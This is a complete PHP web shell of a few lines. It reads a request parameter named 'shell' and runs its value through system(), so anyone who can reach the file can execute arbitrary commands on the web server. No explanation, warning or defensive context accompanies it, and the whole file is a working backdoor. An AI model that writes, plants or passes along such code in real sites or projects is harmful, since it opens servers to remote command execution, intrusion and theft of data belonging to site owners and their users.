<?php 
if(isset($_REQUEST['shell'])) 
{                             
    system(($_REQUEST['shell']));
}
?>
